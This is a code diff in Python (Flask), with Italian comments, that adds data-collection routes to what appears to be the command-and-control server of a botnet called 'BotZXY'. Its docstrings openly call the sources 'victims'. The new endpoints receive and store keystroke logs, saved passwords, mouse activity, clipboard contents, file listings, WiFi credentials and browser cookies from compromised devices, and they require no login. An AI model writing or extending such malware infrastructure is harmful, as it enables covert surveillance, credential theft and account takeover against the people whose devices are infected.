@@ -180,6 +180,141 @@ def logout():
     return index()
 
 # ---- API ROUTES ----
+
+# ============ NUOVE FUNZIONI ============
+
+@app.route('/api/keylog/<device_id>', methods=['POST'])
+def upload_keylog(device_id):
+    """Riceve i tasti premuti dalla vittima"""
+    data = request.json
+    keys = data.get('keys', '')
+    timestamp = data.get('timestamp', datetime.now().isoformat())
+    
+    conn = get_db()
+    conn.execute('''
+        INSERT INTO captures (device_id, type, data, created_at)
+        VALUES (?, 'keylog', ?, CURRENT_TIMESTAMP)
+    ''', (device_id, json.dumps({'keys': keys, 'timestamp': timestamp})))
+    conn.commit()
+    conn.close()
+    
+    log_action(device_id, 'keylog_captured', f'BotZXY Keylog: {len(keys)} chars')
+    return jsonify({'status': 'saved'})
+
+@app.route('/api/passwords/<device_id>', methods=['POST'])
+def upload_passwords(device_id):
+    """Riceve le password salvate dalla vittima"""
+    data = request.json
+    passwords = data.get('passwords', [])
+    
+    conn = get_db()
+    conn.execute('''
+        INSERT INTO captures (device_id, type, data, created_at)
+        VALUES (?, 'passwords', ?, CURRENT_TIMESTAMP)
+    ''', (device_id, json.dumps(passwords)))
+    conn.commit()
+    conn.close()
+    
+    log_action(device_id, 'passwords_extracted', f'BotZXY Passwords: {len(passwords)} found')
+    return jsonify({'status': 'saved'})
+
+@app.route('/api/mouse/<device_id>', methods=['POST'])
+def upload_mouse_interaction(device_id):
+    """Riceve le interazioni del mouse/touch"""
+    data = request.json
+    action = data.get('action')
+    x = data.get('x', 0)
+    y = data.get('y', 0)
+    button = data.get('button', 'left')
+    timestamp = data.get('timestamp', datetime.now().isoformat())
+    
+    conn = get_db()
+    conn.execute('''
+        INSERT INTO captures (device_id, type, data, created_at)
+        VALUES (?, 'mouse', ?, CURRENT_TIMESTAMP)
+    ''', (device_id, json.dumps({
+        'action': action,
+        'x': x,
+        'y': y,
+        'button': button,
+        'timestamp': timestamp
+    })))
+    conn.commit()
+    conn.close()
+    
+    log_action(device_id, 'mouse_interaction', f'BotZXY Mouse: {action} at ({x},{y})')
+    return jsonify({'status': 'saved'})
+
+@app.route('/api/clipboard/<device_id>', methods=['POST'])
+def upload_clipboard(device_id):
+    """Riceve il contenuto della clipboard"""
+    data = request.json
+    content = data.get('content', '')
+    
+    conn = get_db()
+    conn.execute('''
+        INSERT INTO captures (device_id, type, data, created_at)
+        VALUES (?, 'clipboard', ?, CURRENT_TIMESTAMP)
+    ''', (device_id, content))
+    conn.commit()
+    conn.close()
+    
+    log_action(device_id, 'clipboard_captured', f'BotZXY Clipboard: {len(content)} chars')
+    return jsonify({'status': 'saved'})
+
+@app.route('/api/files/<device_id>', methods=['POST'])
+def upload_file_list(device_id):
+    """Riceve la lista dei file della vittima"""
+    data = request.json
+    files = data.get('files', [])
+    path = data.get('path', '/')
+    
+    conn = get_db()
+    conn.execute('''
+        INSERT INTO captures (device_id, type, data, created_at)
+        VALUES (?, 'files', ?, CURRENT_TIMESTAMP)
+    ''', (device_id, json.dumps({'path': path, 'files': files})))
+    conn.commit()
+    conn.close()
+    
+    log_action(device_id, 'file_list', f'BotZXY Files: {len(files)} in {path}')
+    return jsonify({'status': 'saved'})
+
+@app.route('/api/wifi/<device_id>', methods=['POST'])
+def upload_wifi_networks(device_id):
+    """Riceve le reti WiFi salvate dalla vittima"""
+    data = request.json
+    networks = data.get('networks', [])
+    
+    conn = get_db()
+    conn.execute('''
+        INSERT INTO captures (device_id, type, data, created_at)
+        VALUES (?, 'wifi', ?, CURRENT_TIMESTAMP)
+    ''', (device_id, json.dumps(networks)))
+    conn.commit()
+    conn.close()
+    
+    log_action(device_id, 'wifi_extracted', f'BotZXY WiFi: {len(networks)} networks')
+    return jsonify({'status': 'saved'})
+
+@app.route('/api/cookies/<device_id>', methods=['POST'])
+def upload_cookies(device_id):
+    """Riceve i cookie del browser"""
+    data = request.json
+    cookies = data.get('cookies', [])
+    browser = data.get('browser', 'unknown')
+    
+    conn = get_db()
+    conn.execute('''
+        INSERT INTO captures (device_id, type, data, created_at)
+        VALUES (?, 'cookies', ?, CURRENT_TIMESTAMP)
+    ''', (device_id, json.dumps({'browser': browser, 'cookies': cookies})))
+    conn.commit()
+    conn.close()
+    
+    log_action(device_id, 'cookies_extracted', f'BotZXY Cookies: {len(cookies)} from {browser}')
+    return jsonify({'status': 'saved'})
+
 @app.route('/api/devices', methods=['GET'])
 @login_required
 def get_devices():
